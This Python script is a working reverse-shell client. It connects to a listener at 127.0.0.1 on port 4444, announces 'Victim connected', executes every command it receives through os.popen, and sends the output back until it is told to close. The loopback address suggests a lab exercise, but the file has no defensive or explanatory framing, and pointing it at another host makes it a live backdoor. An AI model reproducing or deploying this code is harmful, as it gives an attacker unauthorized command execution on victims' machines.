import socket
import os
import subprocess
import time

def main():
	s = socket.socket()
	s.connect(('127.0.0.1',4444))
	print("Victim connected")
	run = True
	while	run : 
			
		command = s.recv(1024)
		command = str(command.decode('utf-8'))
		if 'close' in command :
		    s.close()
		    run = False
		else :    
		    	#output = subprocess.Popen(command, stdout=subprocess.PIPE)
		    	output = os.popen(command).read()
		    	#print(output)
		    	#output = output.stdout.read()
		    	output = str(output).encode()
		    	s.send(output)	
main()
